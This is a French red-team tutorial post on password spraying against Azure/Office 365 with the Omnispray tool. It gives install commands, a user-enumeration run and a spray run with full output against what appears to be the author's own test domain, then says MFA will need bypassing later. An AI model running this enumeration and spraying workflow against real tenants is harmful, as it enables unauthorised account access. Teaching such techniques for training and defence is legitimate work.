+++
author = "Enzo"
title = "Azure - Password Spraying"
date = "2026-06-24"
categories = [
    "Red Team"
]
tags = [
    "AD",
    "Azure",
    "CTF",
    "Cours",
    "Bruteforce",
    "Spraying"
]
+++
# Azure - Password Spraying
## C'est quoi ? 
Une attaque par password spraying c'est l'inverse d'une attaque par Bruteforce. En gros, au lieu de tester 100 mots de passe sur 1 utilisateur, nous allons tester 1 mot de passe sur 100 utilisateurs (ex : je test le mot de passe `password` sur ma liste `email.txt`). 

Cette technique permet aux attanquants d'être plus discret, car ce genre de comportement est moins bruyant dans les logs.

## Installation 
Pour réaliser un "Spray" nous devons d'abord savoir si les mails sont réellement valide, pour cela pouvons passer par ``Omnispray``. Omnispray est un script python développé par `0xZDH` et disponible sur github au repo suivant : 
[https://github.com/0xZDH/Omnispray](https://github.com/0xZDH/Omnispray)

Pour l'installer il suffit de suivre les étapes des bases d'un clone de repo : 
````Bash
git clone https://github.com/0xZDH/Omnispray
cd Omnispray
pip3 install -r requirements.txt --break-system-packages
````

Une fois installé nous pouvons exécuter le script avec notre liste de mails réalisé dans le poste `Azure - OSINT` : 
````Bash
python3 omnispray.py --type enum -uf ../username-anarchy/emails.txt --module o365_enum_office

            *** Omnispray ***

>---------------------------------------<

   > version        :  0.1.4
   > module         :  o365_enum_office
   > type           :  enum
   > userfile       :  ../username-anarchy/emails.txt
   > count          :  1 passwords/spray
   > lockout        :  15.0 minutes
   > wait           :  5.0
   > timeout        :  25 seconds
   > pause          :  0.25 seconds
   > rate           :  10 threads
   > start          :  2026-06-24 09:50:40

>---------------------------------------<

/home/kiron/Omnispray/omnispray.py:319: DeprecationWarning: There is no current event loop
  loop = asyncio.get_event_loop()
[2026-06-24 09:50:40,839] INFO : Generating prerequisite data via office.com...
[2026-06-24 09:50:41,477] INFO : Enumerating 14 users via 'o365_enum_office' module
[2026-06-24 09:50:42,200] INFO : [ + ] enzo.ribeiro@domaine.com
[ - ] er@domaine.com
[2026-06-24 09:50:43,390] INFO : Results can be found in: '/home/kiron/Omnispray/results/'
[2026-06-24 09:50:43,390] INFO : Valid user accounts: 1

[2026-06-24 09:50:43,641] INFO : /home/kiron/Omnispray/omnispray.py executed in 2.99 seconds.
````
(Ici, je n'ai que mon utilisateur, il va tester mes mails seulement, si nous en avions plusieurs, avec la même nomenclature, nous aurions plus de résultat)

Ensuite, nous pouvons tester notre "Spray" sur nos/notre utilisateur/s avec la commande suivante : 
````Bash
python3 omnispray.py --type spray -uf ../username-anarchy/emails.txt -p 'password' --module o365_spray_msol

            *** Omnispray ***

>---------------------------------------<

   > version        :  0.1.4
   > module         :  o365_spray_msol
   > type           :  spray
   > userfile       :  ../username-anarchy/emails.txt
   > password       :  password
   > count          :  1 passwords/spray
   > lockout        :  15.0 minutes
   > wait           :  5.0
   > timeout        :  25 seconds
   > pause          :  0.25 seconds
   > rate           :  10 threads
   > start          :  2026-06-24 10:21:52

>---------------------------------------<

/home/kiron/Omnispray/omnispray.py:319: DeprecationWarning: There is no current event loop
  loop = asyncio.get_event_loop()
[2026-06-24 10:04:28,663] INFO : Password spraying 14 users via 'o365_spray_msol' module
[2026-06-24 10:04:28,663] INFO : Password spraying the following passwords: ['password']
[2026-06-24 10:04:29,262] INFO : [ - ] ribeiroe@domaine.com:password [USER_NOT_FOUND: User does not exist]
[2026-06-24 10:04:29,266] INFO : [ - ] enzoribeiro@domaine.com:password [USER_NOT_FOUND: User does not exist]
[2026-06-24 10:04:29,269] INFO : [ - ] enzo@domaine.com:password [USER_NOT_FOUND: User does not exist]
[2026-06-24 10:04:29,293] INFO : [ - ] enzor@domaine.com:password [USER_NOT_FOUND: User does not exist]
[2026-06-24 10:04:29,317] INFO : [ - ] r.enzo@domaine.com:password [USER_NOT_FOUND: User does not exist]
[2026-06-24 10:04:29,367] INFO : [ - ] enzoribe@domaine.com:password [USER_NOT_FOUND: User does not exist]
[2026-06-24 10:04:29,387] INFO : [ - ] enzo.ribeiro@domaine.com:password [VALID_MFA: Response indicates MFA (Microsoft)]
[2026-06-24 10:04:29,393] INFO : [ - ] renzo@domaine.com:password [USER_NOT_FOUND: User does not exist]
[2026-06-24 10:04:29,726] INFO : [ - ] eribeiro@domaine.com:password [USER_NOT_FOUND: User does not exist]
[2026-06-24 10:04:29,767] INFO : [ - ] e.ribeiro@domaine.com:password [USER_NOT_FOUND: User does not exist]
[2026-06-24 10:04:29,771] INFO : [ - ] er@domaine.com:password [USER_NOT_FOUND: User does not exist]
[2026-06-24 10:04:29,779] INFO : [ - ] ribeiro.e@domaine.com:password [USER_NOT_FOUND: User does not exist]
[2026-06-24 10:04:29,790] INFO : [ - ] ribeiro.enzo@domaine.com:password [USER_NOT_FOUND: User does not exist]
[2026-06-24 10:04:29,810] INFO : [ - ] ribeiro@domaine.com:password [USER_NOT_FOUND: User does not exist]

[2026-06-24 10:04:29,813] INFO : Results can be found in: '/home/kiron/Omnispray/results/'
[2026-06-24 10:04:29,813] INFO : Valid credentials: 0

[2026-06-24 10:04:30,064] INFO : /home/kiron/Omnispray/omnispray.py executed in 1.51 seconds.
````
###  Explication de la commande : 
 - `--type spray` : déclare le mode que nous voulons utiliser (enum ou spray)
 - `-uf ../username-anarchy/emails.txt` : donne le fichier d'utilisateur que nous voulons tester (il est possible de mettre un seul utilisateur avec le paramètre `-u <mail>`)
 - `-p password` : pour préciser le mot de passe que nous voulons tester (possible de mettre `-pf` pour donner un fichier de mot de passe)
 - `--module o365_spray_msol` : déclare le module que nous voulons utiliser pour réaliser le "spray" il en existe d'autre mais celui la est plus bavard

Ici, nous pouvons voir qu'aucun mot de passe ne valide la connexion ... normal, nous pouvons voir que sur toutes les tentatives nous avons le code `[USER_NOT_FOUND: User does not exist]` sauf sur un : `enzo.ribeiro@domaine.com:password` où nous avons le message `[VALID_MFA: Response indicates MFA (Microsoft)]` car ma MFA est activé, il faudra donc la bypass par la suite.